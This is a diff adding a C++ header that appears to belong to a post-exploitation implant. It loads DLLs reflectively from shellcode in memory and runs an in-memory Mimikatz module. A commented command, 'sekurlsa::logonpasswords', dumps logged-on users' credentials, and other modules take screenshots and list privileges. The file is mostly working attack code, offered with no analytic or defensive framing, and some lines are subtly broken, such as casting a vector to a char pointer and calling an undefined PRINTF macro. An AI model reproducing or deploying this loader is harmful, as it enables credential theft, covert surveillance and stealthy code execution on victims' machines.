@@ -1,0 +1,332 @@
+﻿#pragma once
+
+#define WIN32_LEAN_AND_MEAN
+#define _CRT_SECURE_NO_WARNINGS
+#define no_init_all
+
+#include <windows.h>
+#include <shellapi.h>
+#include <string>
+#include <iostream>
+#include <regex>
+#include <wincrypt.h>
+#include <fstream>
+#include <atlstr.h>
+
+#pragma comment (lib, "Shell32.lib")
+#pragma comment (lib, "crypt32.lib")
+
+#define DEREF_64(name) *(DWORD64 *)(name)
+#define DEREF_32(name) *(DWORD *)(name)
+#define DEREF_16(name) *(WORD *)(name)
+#define DEREF_8(name)  *(BYTE *)(name)
+#define RVA(type, base, rva) (type)((ULONG_PTR) base + rva)
+
+// Function typedefs
+typedef UINT_PTR(WINAPI* RDI)();
+typedef const char* (__cdecl* SCRNSHOTTASK)(); // For screenshot ExecuteW
+typedef LPWSTR(__cdecl* LPW)();     // For listprivs ExecuteW
+
+// Get exported function address manually from loaded DLL
+FARPROC GetProcAddressR(HMODULE hModule, LPCSTR lpProcName)
+{
+	if (!hModule || !lpProcName) return NULL;
+
+	PIMAGE_NT_HEADERS ntHeaders = RVA(PIMAGE_NT_HEADERS, hModule, ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);
+	PIMAGE_DATA_DIRECTORY dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+	if (!dataDir->Size) return NULL;
+
+	PIMAGE_EXPORT_DIRECTORY exportDir = RVA(PIMAGE_EXPORT_DIRECTORY, hModule, dataDir->VirtualAddress);
+	if (!exportDir->NumberOfNames || !exportDir->NumberOfFunctions) return NULL;
+
+	PDWORD expName = RVA(PDWORD, hModule, exportDir->AddressOfNames);
+	PWORD expOrdinal = RVA(PWORD, hModule, exportDir->AddressOfNameOrdinals);
+
+	for (DWORD i = 0; i < exportDir->NumberOfNames; i++, expName++, expOrdinal++)
+	{
+		LPCSTR expNameStr = RVA(LPCSTR, hModule, *expName);
+		if (!_stricmp(lpProcName, expNameStr))
+		{
+			DWORD funcRva = *RVA(PDWORD, hModule, exportDir->AddressOfFunctions + (*expOrdinal * 4));
+			return RVA(FARPROC, hModule, funcRva);
+		}
+	}
+
+	return NULL;
+}
+
+// Load DLL from RDI shellcode blob
+HMODULE loadDll(const std::string& dllBlob)
+{
+	size_t size = dllBlob.size();
+	std::vector<BYTE> shellcodeBuf(dllBlob.begin(), dllBlob.end());
+
+	LPSTR finalShellcode = NULL;
+	DWORD finalSize = 0;
+	bool needsFree = false;
+
+	finalShellcode = (LPSTR)shellcodeBuf;
+	finalSize = (DWORD)size;
+
+	DWORD dwOldProtect = 0;
+	SYSTEM_INFO sysinfo;
+	GetNativeSystemInfo(&sysinfo);
+
+	if (!VirtualProtect(finalShellcode, sysinfo.dwPageSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
+		PRINTF("FAILED");
+		exit(1);
+	}
+
+	RDI rdi = (RDI)(finalShellcode);
+	HMODULE hLoadedDLL = (HMODULE)rdi();
+
+	if (needsFree) free(finalShellcode);
+	return hLoadedDLL;
+	/*
+
+	size_t size = dllBlob.size();
+	LPSTR execMemory = NULL;
+	LPVOID execMemory = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	if (!execMemory) {
+		PRINTF("[-] VirtualAlloc failed\n");
+		return NULL;
+	}
+	
+	&execMemory = (LPSTR)malloc(size + 1);
+
+	memcpy(execMemory, dllBlob.data(), size);
+	DWORD num = 0;
+	SYSTEM_INFO sysinfo;
+	GetNativeSystemInfo(&sysinfo);
+	if (!VirtualProtect(execMemory, sysinfo.dwPageSize, PAGE_EXECUTE_READWRITE, &num)) {
+		PRINTF("FAILED");
+		exit(1);
+	}
+
+	PRINTF("[*] Executing RDI shellcode stub...\n");
+	RDI rdi = (RDI)(execMemory);
+	HMODULE hLoadedDLL = (HMODULE)rdi();
+
+	if (!hLoadedDLL) {
+		PRINTF("[-] DLL load failed in RDI call.\n");
+	}
+	else {
+		PRINTF("[+] DLL successfully loaded via RDI.\n");
+	}
+
+	VirtualFree(execMemory, 0, MEM_RELEASE);
+	return hLoadedDLL;
+	*/
+}
+
+
+// Convert wide string to UTF-8
+std::string toString(const std::wstring& wstr)
+{
+	if (wstr.empty()) return {};
+	int len = WideCharToMultiByte(CP_UTF8, 0, wstr.data(), (int)wstr.size(), nullptr, 0, nullptr, nullptr);
+	std::string str(len, 0);
+	WideCharToMultiByte(CP_UTF8, 0, wstr.data(), (int)wstr.size(), &str[0], len, nullptr, nullptr);
+	return str;
+}
+
+// Convert UTF-8 to wide string
+std::wstring toWstring(const std::string& str)
+{
+	if (str.empty()) return {};
+	int len = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), nullptr, 0);
+	std::wstring wstr(len, 0);
+	MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstr[0], len);
+	return wstr;
+}
+
+// Convert WCHAR to std::string
+std::string WCharToString(const WCHAR* wstr) {
+	if (!wstr) return "";
+
+	int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, nullptr, 0, nullptr, nullptr);
+	if (size_needed <= 0) return "";
+
+	std::string str(size_needed, 0);
+	WideCharToMultiByte(CP_UTF8, 0, wstr, -1, &str[0], size_needed, nullptr, nullptr);
+	str.pop_back(); // remove null terminator added by WideCharToMultiByte
+	return str;
+}
+
+std::string load_execute_mimikatz(std::string &dll, const std::string &commands) {
+	HMODULE hMimikatz = loadDll(dll);
+	if (!hMimikatz)
+	{
+		printf("failed to load mimikatz DLL\n");
+	}
+
+	typedef void(WINAPI *Function)();
+	typedef LPWSTR(WINAPI *FunctionWStr)(LPCWSTR);
+
+#if _DEBUG
+	LoadLibraryA("User32.dll");
+#endif
+
+	Function initFunction = (Function)GetProcAddressR(hMimikatz, "Init");
+	if (!initFunction)
+	{
+		printf("[DEBUG] initFunction FAILED\n");
+	}
+	else {
+#if _DEBUG
+		printf("[+] Calling init functon\n");
+#endif
+		initFunction();
+	}
+
+	FunctionWStr invokeFunction = (FunctionWStr)GetProcAddressR(hMimikatz, "Invoke");
+	std::wstring myout = L"";
+	if (invokeFunction)
+	{
+#if _DEBUG
+		printf("[+] Calling Invoke functon\n");
+#endif
+		//std::wstring cmd = L"privilege::debug;sekurlsa::logonpasswords;exit";
+		
+		std::wstring cmd = toWstring(commands);
+
+		LPWSTR output = invokeFunction(cmd.c_str());
+		myout = output;
+
+		//*wout = myout;
+		// NOTE: convert if you need to use an ASCII string.
+
+#if _DEBUG
+		printf("output is : \n");
+		wprintf(myout.c_str());
+		printf("\n");
+#endif
+	}
+
+	Function cleanupFunction = (Function)GetProcAddressR(hMimikatz, "Cleanup");
+	if (cleanupFunction)
+	{
+#if _DEBUG
+		printf("[+] Calling cleanup functon\n");
+#endif
+		cleanupFunction();
+		//iRet = 0;
+	}
+
+	if (hMimikatz)
+		FreeLibrary(hMimikatz);
+
+	return toString(myout);
+}
+
+/*
+// Load and execute screenshot DLL (returns PNG in base64 as std::string)
+int load_execute_ss(std::string& dll, std::string& out)
+{
+	PRINTF("[*] Starting DLL load for screenshot...\n");
+	HMODULE hDLL = loadDll(dll);
+	if (!hDLL) {
+		PRINTF("[-] loadDll failed in load_execute_ss.\n");
+		return -1;
+	}
+
+	PRINTF("[*] Resolving exported function 'ExecuteW'...\n");
+	void* fn = GetProcAddressR(hDLL, "ExecuteW");
+	if (!fn) {
+		PRINTF("[-] ExecuteW not found in DLL.\n");
+		FreeLibrary(hDLL);
+		return -1;
+	}
+
+	PRINTF("[+] Calling ExecuteW to get screenshot...\n");
+	try {
+		SCRNSHOTTASK exportedFunction = (SCRNSHOTTASK)fn;
+		const char* base64Screenshot = exportedFunction();
+		out = std::string(base64Screenshot);
+
+	}
+	catch (...) {
+		PRINTF("[-] Exception occurred in ExecuteW.\n");
+		FreeLibrary(hDLL);
+		return -1;
+	}
+
+	SecureZeroMemory(hDLL, sizeof(hDLL));
+	FreeLibrary(hDLL);
+	return 0;
+}
+*/
+// NEW: Load and execute screenshot DLL (returns PNG base64 as std::wstring)
+int load_execute_ss(std::string& dll, std::wstring& out)
+{
+	PRINTF("[*] Starting DLL load for screenshot (wstring)...\n");
+	HMODULE hDLL = loadDll(dll);
+	if (!hDLL) {
+		PRINTF("[-] loadDll failed in load_execute_ss (wstring).\n");
+		return -1;
+	}
+
+	PRINTF("[*] Resolving exported function 'ExecuteW'...\n");
+	void* fn = GetProcAddressR(hDLL, "ExecuteW");
+	if (!fn) {
+		PRINTF("[-] ExecuteW not found in DLL.\n");
+		FreeLibrary(hDLL);
+		return -1;
+	}
+
+	PRINTF("[+] Calling ExecuteW to get screenshot (wstring)...\n");
+	try {
+		LPW exportedFunction = (LPW)fn;
+		LPWSTR lpsz = exportedFunction();
+		out = std::wstring(lpsz);
+	}
+	catch (...) {
+		PRINTF("[-] Exception occurred in ExecuteW (wstring).\n");
+		FreeLibrary(hDLL);
+		return -1;
+	}
+
+	SecureZeroMemory(hDLL, sizeof(hDLL));
+	FreeLibrary(hDLL);
+	return 0;
+}
+
+
+// Load and execute listprivs DLL
+int load_execute_listprivs(std::string& dll, std::string& out)
+{
+	PRINTF("[*] Starting DLL load for listprivs...\n");
+	HMODULE hDLL = loadDll(dll);
+	if (!hDLL) {
+		PRINTF("[-] loadDll failed in load_execute_listprivs.\n");
+		return -1;
+	}
+
+	PRINTF("[*] Resolving exported function 'ExecuteW'...\n");
+	void* fn = GetProcAddressR(hDLL, "ExecuteW");
+	if (!fn) {
+		PRINTF("[-] ExecuteW not found in DLL.\n");
+		FreeLibrary(hDLL);
+		return -1;
+	}
+
+	PRINTF("[+] Calling ExecuteW to get listprivs...\n");
+	try {
+		LPW exportedFunction = (LPW)fn;
+		LPWSTR lpsz = exportedFunction();
+		if (lpsz) {
+			out = CW2A(lpsz);
+			LocalFree(lpsz);
+			lpsz = NULL;
+		}
+	}
+	catch (...) {
+		PRINTF("[-] Exception occurred in ExecuteW.\n");
+		FreeLibrary(hDLL);
+		return -1;
+	}
+
+	FreeLibrary(hDLL);
+	return 0;
+}
